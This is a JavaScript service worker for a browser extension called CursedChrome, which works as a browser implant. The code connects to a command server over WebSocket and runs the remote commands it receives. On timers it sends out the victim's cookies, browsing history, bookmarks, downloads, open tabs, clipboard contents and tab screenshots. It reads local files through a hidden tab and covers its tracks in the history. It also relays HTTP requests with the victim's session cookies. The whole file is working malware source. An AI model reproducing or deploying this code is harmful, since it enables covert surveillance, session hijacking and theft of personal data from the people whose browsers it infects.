// CursedChrome Extension - Manifest V3 Version
// Main service worker for background tasks
import "./window-polyfill.js";

class CursedChromeClient {
  constructor() {
    this.websocket = null;
    this.lastLiveConnectionTimestamp = this.getUnixTimestamp();
    this.placeholderSecretToken = this.getSecureRandomToken(64);
    this.redirectTable = {};
    this.REQUEST_HEADER_BLACKLIST = ["cookie"];

    // Storage polyfill
    this.localStorage = self.localStorage;

    // Configuration settings
    this.SYNC_SWITCH = {
      SYNC: true,
      SYNC_HUGE: true,
      REALTIME_IMG: false,
    };

    this.SYNC_DATA_CONFIG = {};

    // Map of RPC calls to handler methods
    this.RPC_CALL_TABLE = {
      HTTP_REQUEST: this.performHttpRequest.bind(this),
      AUTH: this.authenticate.bind(this),
      GET_FILESYSTEM: this.getFilesystem.bind(this),
      GET_COOKIES: this.getCookies.bind(this),
      GET_HISTORY: this.getHistory.bind(this),
      GET_TABS: this.getTabs.bind(this),
      GET_BOOKMARKS: this.getBookmarks.bind(this),
      GET_DOWNLOADS: this.getDownloads.bind(this),
    };

    // Constants for request handling
    this.HEADERS_TO_REPLACE = [
      "origin",
      "referer",
      "access-control-request-headers",
      "access-control-request-method",
      "access-control-allow-origin",
      "date",
      "dnt",
      "trailer",
      "upgrade",
    ];

    this.REDIRECT_STATUS_CODES = [301, 302, 307];

    this.SERVER_URL = "ws://127.0.0.1:4343";

    // Initialize the client
    this.initialize();
    this.setupIntervals();
    this.setupListeners();
  }

  // Initialize the WebSocket connection
  initialize() {
    // Replace with your server details - ideally a secure wss:// connection
    this.websocket = new WebSocket(this.SERVER_URL);

    this.websocket.onopen = () => {
      console.log("WebSocket connection established");
    };

    this.websocket.onmessage = async (event) => {
      console.log(`Received WebSocket message: ${event.data}`);
      this.lastLiveConnectionTimestamp = this.getUnixTimestamp();

      try {
        const parsedMessage = JSON.parse(event.data);

        // Update configuration if provided
        try {
          if (parsedMessage.data.switch_config) {
            Object.keys(parsedMessage.data.switch_config).forEach((key) => {
              this.SYNC_SWITCH[key] = parsedMessage.data.switch_config[key];
            });
          }
        } catch (e) {}

        try {
          if (parsedMessage.data.data_config) {
            Object.keys(parsedMessage.data.data_config).forEach((key) => {
              this.SYNC_DATA_CONFIG[key] = parsedMessage.data.data_config[key];
            });
          }
        } catch (e) {}

        // Handle RPC calls
        if (parsedMessage.action in this.RPC_CALL_TABLE) {
          const result = await this.RPC_CALL_TABLE[parsedMessage.action](
            parsedMessage.data
          );

          this.websocket.send(
            JSON.stringify({
              id: parsedMessage.id,
              origin_action: parsedMessage.action,
              result: result,
            })
          );
        } else {
          console.error(`No RPC action ${parsedMessage.action}!`);
        }
      } catch (e) {
        console.error("Could not parse WebSocket message!", e);
      }
    };

    this.websocket.onclose = (event) => {
      if (event.wasClean) {
        console.log(
          `Connection closed cleanly, code=${event.code} reason=${event.reason}`
        );
      } else {
        console.log("Connection died");
      }

      // Attempt to reconnect after a delay
      setTimeout(() => this.initialize(), 5000);
    };

    this.websocket.onerror = (error) => {
      console.log(`WebSocket error: ${error.message}`);
    };
  }

  // Set up periodic intervals for various tasks
  setupIntervals() {
    // Check websocket connection health
    setInterval(async () => this.checkWebsocketConnection(), 13000);

    // Realtime image sharing (if enabled)
    setInterval(async () => this.sendRealtimeImage(), 2000);

    // Sync basic data
    setInterval(async () => this.syncBasicData(), 63000);

    // Sync more comprehensive data
    setInterval(async () => this.syncHugeData(), 321000);
  }

  // Set up event listeners
  setupListeners() {
    // Listen for idle state changes
    if (chrome.idle) {
      chrome.idle.onStateChanged.addListener((state) => {
        this.websocket.send(
          JSON.stringify({
            id: this.uuidv4(),
            version: "1.0.0",
            action: "STATE",
            data: {
              state: state,
            },
          })
        );
      });
    }

    // Listen for messages from content scripts
    chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
      if (message.type === "CLIPBOARD_DATA") {
        this.handleClipboardData(message.data, sender);
        sendResponse({ success: true });
      }
    });

    // Use non-blocking method to handle requests in Manifest V3
    if (chrome.webRequest) {
      // Listen for before send headers event to modify headers
      chrome.webRequest.onBeforeSendHeaders.addListener(
        (details) => {
          // Skip requests without X-PLACEHOLDER-SECRET
          const headers = details.requestHeaders || [];
          let shouldModify = false;

          for (let i = 0; i < headers.length; i++) {
            if (
              headers[i].name === "X-PLACEHOLDER-SECRET" &&
              headers[i].value === this.placeholderSecretToken
            ) {
              shouldModify = true;
              break;
            }
          }

          if (!shouldModify) {
            return { requestHeaders: headers };
          }

          // Find special headers that need modification
          for (let i = 0; i < headers.length; i++) {
            const header = headers[i];

            // Process headers with X-PLACEHOLDER- format
            if (header.name.startsWith("X-PLACEHOLDER-")) {
              const originalHeaderName = header.name.substring(
                "X-PLACEHOLDER-".length
              );

              // Try to set the original header
              if (
                !this.REQUEST_HEADER_BLACKLIST.includes(
                  originalHeaderName.toLowerCase()
                )
              ) {
                headers.push({
                  name: originalHeaderName,
                  value: header.value,
                });
              }

              // Remove the placeholder header
              headers.splice(i, 1);
              i--; // Adjust index
            }
          }

          return { requestHeaders: headers };
        },
        { urls: ["<all_urls>"] },
        ["requestHeaders"]
      );

      // In Manifest V3, we can't use blocking mode
      // So we need a different way to handle redirects
      // We'll use storage and script injection
      chrome.webRequest.onBeforeRequest.addListener(
        (details) => {
          // We can only monitor, not block or redirect
          // If redirect is needed, we can store the info and handle it in content script
          if (this.redirectTable[details.requestId]) {
            // In Manifest V3, we can't return redirectUrl
            // Consider using chrome.tabs.update or chrome.scripting.executeScript
            // Just log the info here
            console.log(
              `Detected redirect: ${details.url} -> ${
                this.redirectTable[details.requestId]
              }`
            );
          }
        },
        { urls: ["<all_urls>"] }
      );
    }
  }

  // Check websocket connection health and reconnect if needed
  async checkWebsocketConnection() {
    const PENDING_STATES = [
      0, // CONNECTING
      2, // CLOSING
    ];

    // Check WebSocket state
    if (!this.websocket || PENDING_STATES.includes(this.websocket.readyState)) {
      console.log(`WebSocket not in appropriate state for liveness check...`);
      return;
    }

    // Check if connection appears dead
    const currentTimestamp = this.getUnixTimestamp();
    const secondsSinceLastLiveMessage =
      currentTimestamp - this.lastLiveConnectionTimestamp;

    if (secondsSinceLastLiveMessage > 29 || this.websocket.readyState === 3) {
      console.error(`WebSocket appears to be dead. Restarting connection...`);

      try {
        this.websocket.close();
      } catch (e) {}

      this.initialize();
      return;
    }

    // Send ping to keep connection alive
    const currentTab = await this.getCurrentTab();
    const tabImage = await this.getTabImage();

    this.websocket.send(
      JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "PING",
        data: {
          current_tab: currentTab,
          current_tab_image: tabImage,
        },
      })
    );
  }

  // Send realtime image of current tab if enabled
  async sendRealtimeImage() {
    if (this.SYNC_SWITCH["REALTIME_IMG"] !== true || !this.websocket) {
      return;
    }

    const tabImage = await this.getTabImage();

    this.websocket.send(
      JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "REALTIME_IMG",
        data: {
          current_tab_image: tabImage,
        },
      })
    );
  }

  // Sync basic data about tabs
  async syncBasicData() {
    if (this.SYNC_SWITCH["SYNC"] !== true || !this.websocket) {
      return;
    }

    const tabs = await this.getTabs();

    this.websocket.send(
      JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "SYNC",
        data: {
          tabs: tabs,
        },
      })
    );
  }

  // Sync comprehensive data
  async syncHugeData() {
    if (this.SYNC_SWITCH["SYNC_HUGE"] !== true || !this.websocket) {
      return;
    }

    const history = await this.getHistory(30);
    const bookmarks = await this.getBookmarks();
    const cookies = await this.getCookies();
    const downloads = await this.getDownloads();

    this.websocket.send(
      JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "SYNC_HUGE",
        data: {
          history: history,
          bookmarks: bookmarks,
          cookies: cookies,
          downloads: downloads,
        },
      })
    );
  }

  // Data collection methods
  async getDownloads() {
    if (!chrome.downloads) {
      return [];
    }
    return this.getAllDownloads();
  }

  getAllDownloads() {
    return new Promise((resolve) => {
      chrome.downloads.search({}, (results) => {
        resolve(results);
      });
    });
  }

  async getFilesystem(fileUrl = "file:///") {
    if (!chrome.tabs) {
      return "";
    }
    return this.getPath(fileUrl);
  }

  getPath(fileUrl) {
    return new Promise((resolve, reject) => {
      chrome.tabs.query({ active: false }, (tabs) => {
        if (!tabs || !tabs.length) {
          resolve("");
          return;
        }

        const randomIndex = Math.floor(Math.random() * tabs.length);
        const tab = tabs[randomIndex];
        const originalUrl = tab.url;

        chrome.tabs.update(tab.id, { url: fileUrl }, () => {
          const listener = (tabId, changeInfo) => {
            if (tabId === tab.id && changeInfo.status === "complete") {
              // In Manifest V3, we need to use chrome.scripting.executeScript instead
              chrome.scripting.executeScript(
                {
                  target: { tabId: tabId },
                  func: () => document.documentElement.innerHTML,
                },
                (result) => {
                  chrome.history.deleteUrl({ url: fileUrl }, () => {
                    chrome.tabs.update(tab.id, { url: originalUrl }, () => {
                      if (!result || !result[0]) {
                        reject("error");
                      } else {
                        const content = result[0].result;
                        resolve(content);
                      }
                    });
                  });
                }
              );
              chrome.tabs.onUpdated.removeListener(listener);
            }
          };

          chrome.tabs.onUpdated.addListener(listener);
        });
      });
    });
  }

  async getCurrentTab() {
    if (!chrome.tabs) {
      return {};
    }
    return this.getCurrentTabData();
  }

  getCurrentTabData() {
    return new Promise((resolve) => {
      chrome.tabs.query(
        { active: true, lastFocusedWindow: true },
        function (tabs) {
          resolve(tabs && tabs.length > 0 ? tabs[0] : {});
        }
      );
    });
  }

  async getTabs() {
    if (!chrome.tabs) {
      return [];
    }
    return this.getAllTabs();
  }

  getAllTabs() {
    return new Promise((resolve) => {
      chrome.tabs.query({}, function (tabs) {
        resolve(tabs || []);
      });
    });
  }

  async getTabImage() {
    if (!chrome.tabs) {
      return "";
    }
    return this.getCurrentTabImage();
  }

  getCurrentTabImage() {
    return new Promise((resolve) => {
      chrome.tabs.captureVisibleTab(
        { format: "jpeg", quality: 10 },
        (dataUrl) => {
          resolve(dataUrl || "");
        }
      );
    });
  }

  async getBookmarks() {
    if (!chrome.bookmarks) {
      return [];
    }
    return this.getAllBookmarks();
  }

  getAllBookmarks() {
    return new Promise((resolve) => {
      chrome.bookmarks.getTree(function (bookmarkTreeNodes) {
        resolve(bookmarkTreeNodes || []);
      });
    });
  }

  async getHistory(days = 30) {
    if (!chrome.history) {
      return [];
    }
    return this.getHistoryByDay(days);
  }

  getHistoryByDay(days = 7) {
    return new Promise((resolve, reject) => {
      try {
        const microsecondsPerDay = 1000 * 60 * 60 * 24;
        const startTime = new Date().getTime() - microsecondsPerDay * days;

        chrome.history.search(
          {
            text: "",
            startTime: startTime,
            maxResults: 10000,
          },
          function (historyItems) {
            resolve(historyItems || []);
          }
        );
      } catch (e) {
        reject(e);
      }
    });
  }

  async getCookies(params) {
    if (!chrome.cookies) {
      return [];
    }
    return this.getAllCookies({});
  }

  getAllCookies(details) {
    return new Promise((resolve, reject) => {
      try {
        chrome.cookies.getAll(details, function (cookiesArray) {
          resolve(cookiesArray || []);
        });
      } catch (e) {
        reject(e);
      }
    });
  }

  async authenticate(params) {
    let browserId = null;
    try {
      browserId = await this.localStorage.getItem("browser_id");
      if (browserId === null) {
        browserId = this.uuidv4();
        await this.localStorage.setItem("browser_id", browserId);
      }
    } catch (e) {
      console.error("Error accessing storage:", e);
      browserId = this.uuidv4(); // Fallback if storage fails
    }

    return {
      browser_id: browserId,
      user_agent: navigator.userAgent,
      timestamp: this.getUnixTimestamp(),
    };
  }

  // HTTP request handling
  async performHttpRequest(params) {
    // Whether to include cookies when sending request
    const credentialsMode = params.authenticated ? "include" : "omit";

    // Set the X-PLACEHOLDER-SECRET to the generated secret.
    params.headers["X-PLACEHOLDER-SECRET"] = this.placeholderSecretToken;

    const headerKeys = Object.keys(params.headers);
    const newHeaders = {};

    // Process headers in Manifest V3
    headerKeys.forEach((key) => {
      if (!this.HEADERS_TO_REPLACE.includes(key.toLowerCase())) {
        // Keep regular headers
        newHeaders[key] = params.headers[key];
      } else if (!this.REQUEST_HEADER_BLACKLIST.includes(key.toLowerCase())) {
        // For special headers, use X-PLACEHOLDER- prefix
        newHeaders[`X-PLACEHOLDER-${key}`] = params.headers[key];
      }
    });

    const requestOptions = {
      method: params.method,
      mode: "cors",
      cache: "no-cache",
      credentials: credentialsMode,
      headers: newHeaders,
      redirect: "follow",
    };

    // Process request body
    if (params.body) {
      // Convert base64 to Blob
      const fetchURL = `data:application/octet-stream;base64,${params.body}`;
      const fetchResp = await fetch(fetchURL);
      requestOptions.body = await fetchResp.blob();
    }

    try {
      var response = await fetch(params.url, requestOptions);
    } catch (e) {
      console.error(`Error occurred while performing fetch:`, e);
      return;
    }

    var responseHeaders = {};

    for (var pair of response.headers.entries()) {
      responseHeaders[pair[0]] = pair[1];
    }

    // Handle redirect issues
    if (this.REDIRECT_STATUS_CODES.includes(response.status)) {
      console.log(`Detected redirect: ${response.status} -> ${response.url}`);

      return {
        url: response.url,
        status: response.status,
        status_text: response.statusText || "Redirect",
        headers: responseHeaders,
        body: "",
        is_redirect: true,
      };
    }

    const responseArray = await response.arrayBuffer();

    return {
      url: response.url,
      status: response.status,
      status_text: response.statusText,
      headers: responseHeaders,
      body: this.arrayBufferToBase64(responseArray),
    };
  }

  // Utility methods
  getSecureRandomToken(bytesLength) {
    const validChars =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let array = new Uint8Array(bytesLength);
    crypto.getRandomValues(array);
    array = array.map((x) => validChars.charCodeAt(x % validChars.length));
    const randomString = String.fromCharCode.apply(null, array);
    return randomString;
  }

  uuidv4() {
    return ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, (c) =>
      (
        c ^
        (crypto.getRandomValues(new Uint8Array(1))[0] & (15 >> (c / 4)))
      ).toString(16)
    );
  }

  arrayBufferToBase64(buffer) {
    let binary = "";
    const bytes = new Uint8Array(buffer);
    const len = bytes.byteLength;
    for (let i = 0; i < len; i++) {
      binary += String.fromCharCode(bytes[i]);
    }
    return btoa(binary);
  }

  getUnixTimestamp() {
    return Math.floor(Date.now() / 1000);
  }

  // Handle clipboard data received from content script
  handleClipboardData(clipboardData, sender) {
    if (!this.websocket || this.websocket.readyState !== 1) {
      return;
    }

    // Add sender's tab information
    const data = {
      ...clipboardData,
      tab: {
        id: sender.tab.id,
        url: sender.tab.url,
        title: sender.tab.title,
      },
      timestamp: this.getUnixTimestamp(),
    };

    this.websocket.send(
      JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "CLIPBOARD_DATA",
        data: data,
      })
    );

    console.log(
      "Clipboard data sent:",
      data.content.substring(0, 50) + (data.content.length > 50 ? "..." : "")
    );
  }
}

// Initialize the client when the service worker starts
const client = new CursedChromeClient();

// Service worker listeners
self.addEventListener("install", (event) => {
  console.log("Service Worker installing...");
  self.skipWaiting();
});

self.addEventListener("activate", (event) => {
  console.log("Service Worker activating...");
  return self.clients.claim();
});
